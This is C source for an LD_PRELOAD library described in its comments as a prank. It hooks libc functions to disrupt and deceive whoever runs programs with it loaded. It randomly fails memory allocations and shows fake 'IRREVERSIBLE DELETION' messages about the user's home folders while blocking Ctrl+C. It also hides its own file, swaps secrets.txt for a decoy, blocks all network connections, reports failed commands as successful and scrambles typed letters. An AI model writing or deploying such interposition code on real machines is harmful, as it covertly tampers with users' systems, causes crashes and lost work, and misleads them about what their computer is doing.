#define _GNU_SOURCE
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#include <fcntl.h>
#include <stdarg.h>
#include <errno.h>
#include <sys/stat.h>
#include <libgen.h>
#include <limits.h>
#include <sys/types.h> // For PATH_MAX
#include <sys/socket.h> // for connect
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <math.h>
#include <unistd.h>
#include <ctype.h> // for getchar


static void* (*real_malloc)(size_t)=NULL;
ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;
ssize_t (*original_write)(int fd, const void *buf, size_t count) = NULL;
int (*original_open)(const char *pathname, int flags, ...) = NULL;
static int (*real_connect)(int, const struct sockaddr *, socklen_t) = NULL;


// ####### MALLOC #######
long get_random_uint() {
    long r;
    long fd = open("/dev/urandom", O_RDONLY);
    read(fd, &r, sizeof(r));
    close(fd);

    if (r < 0) {
        r = r * (-1);
    }

    r = r/1000;
    return r;  // always >= 0
}

static void mtrace_init(void)
{
    real_malloc = dlsym(RTLD_NEXT, "malloc"); //calls real malloc
    if (NULL == real_malloc) { //error if real malloc couldnt be called
        //fprintf(stderr, "Error in `dlsym`: %s\n", dlerror());
    }
}

void *malloc(size_t size)
{
    long random;
    if(real_malloc==NULL) { //if real malloc doesnt exist call it
        mtrace_init();
    }

    random = get_random_uint(); //generater random number
    random = random % 60000000; // top limit how big rando can be, sweet spot for gnome-waether

    void *p = NULL;
    p = real_malloc(size); //find free space

    if (size > random ){
        return NULL; 
    }
    return p;
}

static int block_count = 0; // Global counter for blocked connections


// Override access() to pretend command-not-found doesn't exist
int access(const char *pathname, int mode) {
    static int (*orig_access)(const char *, int) = NULL;
    if (!orig_access) {
        orig_access = dlsym(RTLD_NEXT, "access");
    }

    if (strstr(pathname, "command-not-found")) {
        errno = ENOENT; // "No such file or directory"
        return -1;
    }

    return orig_access(pathname, mode);
}


//####### READ #######
// Hijack of the read() function. works with cat, less or bash.
void deletion_simulation(const char *user) {
    char *fake_files[] = {
        "/Documents", "/Desktop", "/Public", "/snap", "/Downloads",
        "/.ssh", "/.cache", "/.local", "/.thunderbird", "/Projects", "/Videos"
    }; // simulates the deletion of all personal files

    for (int i = 0; i < 11; ++i) {
        fprintf(stderr, "deleted /home/%s%s\n", user, fake_files[i]);
        usleep(100000);
    }
}

ssize_t read(int fd, void *buf, size_t count) {
    if (!original_read) {
        original_read = dlsym(RTLD_NEXT, "read");
    }

    static int triggered = 0;
    static int done = 0;

    if (done) {
        return 0;  // Fake EOF forever after prank
    }

    if (!triggered) {
        triggered = 1;
        signal(SIGINT, SIG_IGN); // Ignore Ctrl+C

        char exe[512];
        ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
        if (len != -1) {
            exe[len] = '\0';

            if (strstr(exe, "bash") || strstr(exe, "cat") || strstr(exe, "less")) {
                fprintf(stderr, "\033[31mALERT: Unauthorized access detected\n");
                sleep(2);
                deletion_simulation(getenv("USER"));
                fprintf(stderr, "IRREVERSIBLE DELETION COMPLETE\n");
                sleep(3);
                fprintf(stderr, "Enjoy the rest of your day :)");
                sleep(3);
                fprintf(stderr, "\n");
                signal(SIGINT, SIG_DFL); // Reset Ctrl+C
                done = 1;
                return 0;
            }
        }
    }

    return original_read(fd, buf, count);
}

// ####### OPEN #######
int open(const char *pathname, int flags, ...) {
    if (!original_open) {
        original_open = dlsym(RTLD_NEXT, "open");
        if (!original_open) {
            fprintf(stderr, "Error: unable to load original open function\n");
            return -1;
        }
    }

    if (strstr(pathname, "preloadLib")) {
        errno = EACCES; // Permission denied
        return -1;
    }

    if (strstr(pathname, "secrets.txt")) {
        char *path_copy = strdup(pathname);
        char *dir = dirname(path_copy);

        char fake_path[PATH_MAX];
        snprintf(fake_path, sizeof(fake_path), "%s/stillASecret.txt", dir);
        free(path_copy);

        FILE *fp = fopen(fake_path, "w");
        if (fp) {
            fprintf(fp, "you should not be so curious\n");
            fclose(fp);
        } else {
            fprintf(stderr, "Error: could not create %s\n", fake_path);
            return -1;
        }

        return original_open(fake_path, flags);
    }

    if (strstr(pathname, "openThis.txt")) {
        fprintf(stderr, "You have been hacked. Don't do everything you're told\n");
        return 0;
    }

    va_list args;
    va_start(args, flags);
    int mode = va_arg(args, int);
    va_end(args);

    return original_open(pathname, flags, mode);
}


// ####### WRITE #######
// write: in case of command not found print successful
typedef ssize_t (*orig_write_f_type)(int fd, const void *buf, size_t count);

ssize_t write(int fd, const void *buf, size_t count) {
    if (getenv("DISABLE_WRITE_PRANK")) {
        if (!original_write)
            original_write = (orig_write_f_type)dlsym(RTLD_NEXT, "write");
        return original_write(fd, buf, count);
    }

    static orig_write_f_type orig_write = NULL;
    if (!orig_write)
        orig_write = (orig_write_f_type)dlsym(RTLD_NEXT, "write");

    char *msg = strndup(buf, count);
    if (!msg) return orig_write(fd, buf, count);

    if ((strstr(msg, "Command") && strstr(msg, "not found")) || strstr(msg, "Could not find command-not-found")) {
        const char *success_msg = "Finished execution: no errors\n";
        orig_write(fd, success_msg, strlen(success_msg));
        free(msg);
        exit(0);
    }

    ssize_t result = orig_write(fd, msg, count);
    free(msg);
    return result;
}


//####### CONNECT #######
// Override connect() to selectively block certain ports
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    static int (*real_connect)(int, const struct sockaddr *, socklen_t) = NULL;
    if (!real_connect) {
        real_connect = dlsym(RTLD_NEXT, "connect");
    }

    int port = -1;
    char ip[INET6_ADDRSTRLEN] = "unknown";

    if (addr->sa_family == AF_INET) {
        struct sockaddr_in *addr_in = (struct sockaddr_in *)addr;
        port = ntohs(addr_in->sin_port);
        inet_ntop(AF_INET, &addr_in->sin_addr, ip, sizeof(ip));
    } else if (addr->sa_family == AF_INET6) {
        struct sockaddr_in6 *addr_in6 = (struct sockaddr_in6 *)addr;
        port = ntohs(addr_in6->sin6_port);
        inet_ntop(AF_INET6, &addr_in6->sin6_addr, ip, sizeof(ip));
    } else {
        printf("[INTERNET_ACCESS_BLOCKED] Unknown address family (%d)\n", addr->sa_family);
        return real_connect(sockfd, addr, addrlen);
    }

    int blocked_ports[] = {6667, 6697, 993};
    int should_block = 0;

    for (int i = 0; i < sizeof(blocked_ports) / sizeof(blocked_ports[0]); i++) {
        if (port == blocked_ports[i]) {
            should_block = 1;
            break;
        }
    }

    if (should_block) {
        block_count++;
        printf("[INTERNET_ACCESS_BLOCKED] Blocking connection to %s:%d\n", ip, port);
        printf("[INTERNET_ACCESS_BLOCKED] Total blocked: %d\n", block_count);

        FILE *logfile2 = fopen("/tmp/blocked2.log", "a");
        if (logfile2) {
            fprintf(logfile2, "Blocked connection to %s:%d (family %d)\n", ip, port, addr->sa_family);
            fclose(logfile2);
        }

        errno = ECONNREFUSED;
        return -1;
    } else {
        block_count++;
        printf("[INTERNET_ACCESS_BLOCKED] Blocking connection to %s:%d (other connection)\n", ip, port);
        printf("[INTERNET_ACCESS_BLOCKED] Total blocked: %d\n", block_count);

        FILE *logfile = fopen("/tmp/blocked.log", "a");
        if (logfile) {
            if (addr->sa_family == AF_INET) {
                fprintf(logfile, "Blocked IPv4 connection to %s:%d\n", ip, port);
            } else if (addr->sa_family == AF_INET6) {
                fprintf(logfile, "Blocked IPv6 connection to [%s]:%d\n", ip, port);
            }
            fclose(logfile);
        }

        errno = ECONNREFUSED;
        return -1;
    }
}


// ##### GETCHAR PRANK #####
// Supported keyboard layouts (lowercase only)
static const char* LAYOUTS[] = {
    "qwertyuiopasdfghjkl;'\\zxcvbnm,./",  // QWERTY 
    "qwertzuiopasdfghjklöäyxcvbnmü,.-",   // QWERTZ 
    "azertyuiopqsdfghjklmwxcvbn,;:!",      // AZERTY 
    "qwertzuiopasdfghjklöäyxcvbnmü,.-",    // CH DE 
    "qwertyuiopasdfghjkl;'\\zxcvbnm,./",   // CH FR
    NULL
};

// debugging checks
static const char* LAYOUT_NAMES[] = {
    "QWERTY (US)", "QWERTZ (German)", "AZERTY (French)",
    "Swiss-German", "Swiss-French", NULL
};

// what is the current layout
const char* detect_layout() {
    // In a real project, use: `setxkbmap -query` or `/etc/default/keyboard`
    // Here we default to QWERTY for demo purposes
    return LAYOUTS[0]; // Default to QWERTY
}

// Ignore keycap layout and convert to ABCDEFG / abcdefg
char to_alphabetical(char c) {
    const char* layout = detect_layout();
    if (!layout) return c;

    char lower_c = tolower(c);
    const char* pos = strchr(layout, lower_c);
    if (pos) {
        int index = pos - layout;
        return 'a' + index; // Map to abcde...
    }
    return c; // Not a letter, leave unchanged
}

// Hijacked getchar() with prank toggle
int getchar(void) {
    if (getenv("DISABLE_GETCHAR_PRANK")) {
        int (*original_getchar)(void) = dlsym(RTLD_NEXT, "getchar");
        return original_getchar();
    }

    int (*original_getchar)(void) = dlsym(RTLD_NEXT, "getchar");
    int c = original_getchar();

    if (isalpha(c)) {
        char mapped = to_alphabetical(c);
        c = islower(c) ? mapped : toupper(mapped);
    }
    return c;
}
